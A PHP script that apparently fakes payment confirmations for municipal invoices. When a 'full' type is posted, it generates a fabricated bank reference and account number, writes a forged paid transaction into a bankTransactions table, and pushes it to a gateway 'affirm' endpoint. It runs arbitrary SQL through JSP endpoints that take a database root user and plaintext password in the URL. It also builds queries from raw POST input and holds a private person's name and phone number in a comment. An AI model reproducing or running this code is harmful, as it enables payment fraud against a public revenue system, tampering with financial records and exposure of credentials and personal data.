<?php
require 'vendor/autoload.php';

include './includes/core_auto.php';
include './includes/conn_auto.php';
include './includes/conn_pure.php';

//$data = '{"success":true,"invoiceNo":"BL-UBP-060215","amount":"7,500.00","pobox":"","postalcode":"","mobilenumber":"0720448244","applicationNo":"","external_doc":"","business_name":"","business_subsidiary_name":"","description":"-0 for ","dategenerated":"02\/15\/24","status":"Unpaid","customerno":"2020_350227","duedate":"02\/15\/24","customername":"MOSES MUHU NDEGWA","description":"UBP APPLICATION NO TLA063429 - 2020_350227"}';
function universal_dab($command, $head)
{
    $cmd = urlencode($command);
    $url = 'http://192.168.2.142:8080/aggregate/dab.jsp?sqlCommand=' . $cmd;
    $data = httpGet($url, []);
    $data = '<h2>' . $head . '</h2>' . $data . '<br/><br/><br/><br/>';
    return $data;
}
function convertToISO8601($dateTimeString, $timezoneOffset = '+03:00')
{
    // Remove the microseconds part if it exists
    $dateTimeString = preg_replace('/\.\d+/', '', $dateTimeString);

    // Create a DateTime object from the original string
    $dateTime = new DateTime($dateTimeString, new DateTimeZone('UTC'));

    // Set the desired timezone
    $timezone = new DateTimeZone($timezoneOffset);
    $dateTime->setTimezone($timezone);

    // Format the DateTime object to the ISO 8601 format
    $iso8601DateTime = $dateTime->format('Y-m-d\TH:i:sP');

    return $iso8601DateTime;
}

function generateAccountNumber()
{
    // Get the current date and time
    $dateTime = date('YmdHi'); // Format: YYYYMMDDHHMMSS

    // Generate a random 4-digit number to complete the 16-digit account number
    $randomDigits = '';
    for ($i = 0; $i < 4; $i++) {
        $randomDigits .= mt_rand(0, 9);
    }

    // Concatenate the dateTime string and the random digits
    return $dateTime . $randomDigits;
}

function generateCurrentDateWithMidnightTime()
{
    // Create a DateTime object with the current date and time
    $dateTime = new DateTime();

    // Modify the time to "00:00:00"
    $dateTime->setTime(0, 0, 0);

    // Format the date in "d-m-Y H:i:s" format
    return $dateTime->format('d-m-Y H:i:s');
}
function bankTransactions_del($id)
{
    $q = "DELETE FROM bankTransactions WHERE id=" . $id;
    return universal_dab($q, 'bankTransactions');
}

function transactions($clientRefNo)
{
    //$q = "DELETE FROM transactions WHERE id=" . $id;
    $q = "DELETE FROM transactions WHERE clientRefNo='" . $clientRefNo . "'";
    return universal_dab($q, 'transactions');
}

function messenger($url, $headers = '', $payload = '', $method = 'GET')
{
    $url = 'http://192.168.2.142:8080/aggregate/messenger.jsp?url=' . urlencode($url) . '&headers=' . urlencode($headers) . '&payload=' . urlencode($payload) . '&method=' . urlencode($method);
    $data = httpGet($url, []);
    return $data;
}

function extractId($html)
{
    // Load the HTML into a DOMDocument object
    $dom = new DOMDocument();
    @$dom->loadHTML($html);

    // Use DOMXPath to query for the table data
    $xpath = new DOMXPath($dom);
    $idNode = $xpath->query("//table/tr/td")->item(0);

    // Return the text content of the node
    if ($idNode) {
        return $idNode->textContent;
    }
    return null;
}

function universal_dab_b($command, $head)
{
    $cmd = urlencode($command);
    $url = 'http://192.168.2.142:8080/aggregate/my.jsp?dbHost=192.168.0.65&dbName=upgw&dbUser=root&dbPassword=happycoding&dbPort=3306&sqlCommand=' . $cmd;
    $data = httpGet($url, []);
    $data = '<h2>' . $head . '</h2>' . $data . '<br/><br/><br/><br/>';
    return $data;
}

function pushTrans($invoice)
{
    global $conn;
    $stmt = $conn->prepare("SELECT * FROM recLog WHERE inv=:inv");
    $stmt->execute(['inv' => $invoice]);
    $response = $stmt->fetch();
    if (isset($response['data'])) {
        return $response;
    } else {
        die('Invoice not processed here!');
    }
}

if (!isset($_POST['invoiceNo'])) {
    echo json_encode(['error' => 'incomplete request', 'payload' => $_POST]);
    die();
} elseif (isset($_POST['type']) && !isset($_POST['amount'])) {
    echo json_encode(['error' => 'type payload is incomplete', 'payload' => $_POST]);
    die();
}

if (empty($_POST['invoiceNo'])) {
    echo json_encode(['error' => 'empty request', 'payload' => $_POST]);
    die();
} elseif (!empty($_POST['type']) && empty($_POST['amount'])) {
    echo json_encode(['error' => 'type payload is misconfigured', 'payload' => $_POST]);
    die();
}



//$url = 'https://nairobiservices.go.ke/api/authentication/bill/confirm_payment';




$obj = pushTrans($_POST['invoiceNo']);
$data2 = json_decode($obj['data'], true);

if (isset($_POST['type'])) {
    if ($_POST['type'] == 'full') {
        $bypass = ['invoice_no' => $_POST['invoiceNo'], 'amount' => $_POST['amount']];

        $code2Date = (string)generateCurrentDateWithMidnightTime();
        $code2 = (string)generateAccountNumber();
        $bypassAmt = (float)number_format($bypass['amount'], 1, '.', '');
        $timeFormats = getCurrentTimeFormats();
        $timeFrm = $timeFormats['withSeparators'];

        $data2['billAmount'] = $bypassAmt;
        $data2['transactionDate'] =  $code2Date;
        $data2['bankdetails']['accountNumber'] =  $code2;
        $data2['bankdetails']['bankReference'] =  $code2;

        $obj2 = array(
            "success" => true,
            "description" => "Payment Received Successfuly",
            "customer_no" => "NULL",
            "invoice_no" => (string) $bypass['invoice_no'],
            "invoice_report" => "",
            "balance" => number_format($bypassAmt, 1, '.', '')
        );

        $data = httpPost('https://kever.io/auto_process.php', ['invoiceNo' => $_POST['invoiceNo'], 'amount' => $_POST['amount']]);
        $validation = json_decode($data, true);

        $data2 = json_encode($data2, JSON_PRESERVE_ZERO_FRACTION);
        $obj2 = json_encode($obj2, JSON_PRESERVE_ZERO_FRACTION);

        $sqldata = trim(json_encode($data2), '"');
        $sqlobj = trim(json_encode($obj2), '"');



        $bankTransactions = "INSERT INTO bankTransactions ( bankCode,  transactionRef,  amount,  acctRefNo,  accName,  description,  institutionCode,  institutionName,  status,  logDate,  transacDate,  apiCode,  mobileNumber,  transtatus,  billNumber,  tranParticular,  paymentMode,  phoneNumber,  requestoutput,  paymentChannel,  Currency,  BranchCode,  status_1,  ValidationDate,  PushedComments,  transtatus_1 ) VALUES ( '003',  '" . $code2 . "',  " . $bypass['amount'] . ",  '" . $bypass['invoice_no'] . "',  null,  null,  '" . $bypass['invoice_no'] . "',  '" . $validation['description'] . "',  null,  '" . $timeFormats['withSeparators'] . "',  '" . $code2Date . "',  '2f11db8526fb2e170219e4a68215a1b8fe907a6c',  null,  1,  '" . $bypass['invoice_no'] . "',  '" . $bypass['invoice_no'] . " " . strtoupper($validation['description']) . "',  'cash',  null,  '" . $sqldata . "',  null,  null,  null,  null,  '" . $timeFormats['withSeparators'] . "',  '" . $sqlobj . "',  0 )";
        echo $bankTransactions . '<br/><br/>';
        echo universal_dab($bankTransactions, 'bankTransactions') . '<br/><br/>';

    } else {
        $data2 = json_encode($data2, JSON_PRESERVE_ZERO_FRACTION);
    }
} else {
    $data2 = json_encode($data2, JSON_PRESERVE_ZERO_FRACTION);
}


echo $data2 . '<br/><br/>';

$sqldata = trim(json_encode($data2), '"');

//*
$url = 'http://192.168.100.116/gateway/taifa/nrs/affirm';
$headers = 'Content-Type: application/json';
$payload = $data2;
$method = 'POST';
echo messenger($url, $headers, $payload, $method) . '<br/><br/>';
                            //*/





                            //echo bankTransactions_del(162618);
                            //echo transactions(8329712);
